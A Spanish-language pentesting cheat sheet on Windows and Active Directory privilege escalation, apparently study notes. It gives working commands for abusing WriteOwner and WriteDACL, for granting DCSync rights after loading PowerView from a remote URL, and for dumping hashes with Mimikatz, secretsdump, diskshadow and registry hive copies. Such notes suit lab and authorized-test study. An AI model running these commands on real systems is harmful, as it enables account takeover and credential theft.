# Privilege Escalation

## Indice

* [Enumeración](./#enumeracion)
* [Privilegios](./#privilegios)
  * [WriteOwner](./#writeowner)
  * [WriteDACL](./#writedacl)
  * [SeBackupPrivilege](./#sebackupprivilege)
* [Dumpear Hashes](./#dumpear-hashes-en-memoria-a-nivel-local)

## Enumeración

```powershell
# Get current Windows Version
reg query "hklm\software\microsoft\windows nt\currentversion" /v ProductName
[Environment
::Is64BitProcess # 32 or 64 bits

# What can i do
whoami /priv
whoami /all

# List user by perms
net localgroup <PERM>
net localgroup "Remote Managment Users"
```



## Privilegios

### WriteOwner

Este privilegio permite cambiar la contraseña del usuario sobre el que se tenga este privilegio.

```powershell
### Set the owner of claire in the current domain to tom.
Set-DomainObjectOwner -identity claire -OwnerIdentity tom 

### Give tom permissions to change passwords on that ACL
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword 

### Create powershell credential and change credentials. 
$cred = ConvertTo-SecureString "qwer1234QWER!@#$" -AsPlainText -force
Set-DomainUserPassword -identity claire -accountpassword $cred
```

### WriteDACL

Este privilegio permite modificar el DACL (Discretionary Access Control List) del dominio, permitiendo darle cualquier privilegio que se quiera a un determinado objeto del DC, por ejemplo capacidad de DCSync. Para explotar existosamente se debe importar el script de PowerView.ps1 que nos permitira modificar los ACL.

```powershell
# Dar privilegios DCSync a un usuario
IEX(New-object System.Net.WebClient).downloadString('http://<url>/Powerview.ps1')
$SecPassword = ConvertTo-SecureString '<user-pass>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity <domain> -Rights DCSync

# Dumpear hashes
lsadump::dcsync /domain:testlab.local /user:Administrator # Local with Mimikatz
impacket-secretsdump <domain>/<user>@<IP> # Remote with secretsdump
```

### SeBackupPrivilege

Este privilegio permite hacer una copia de seguridad de archivos y directorios.

La explotación se la realiza a traves de **diskshadow.exe** en donde se copia todo el disco C a un disco que nos vamos a montar nosotros para después poder esta montura aunque no podemos examinar el disco C (o el que queramos analizar).

```powershell
# Crear un txt con estos parámetros, y agregar un espacio al final de cada línea
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:

# Ejecutar este comando una vez creado el txt para realizar la montura
diskshadow.exe /s c:\<txt-created>.txt

# Realizar la copia
copy z:\Windows\NTDS\ntds.dit .
robocopy /b z:\Windows\NTDS\ . ntds.dit
```

###

## Dumpear Hashes en memoria a nivel LOCAL

```bash
reg save HKLM\system system # Copiar la key system
reg save HKLM\sam sam       # Copiar la key sam


## Ya en kali
impacket-secretsdump -system system -sam sam LOCAL 
impacket-secretsdump -system system -ntds ntds.dit LOCAL
```

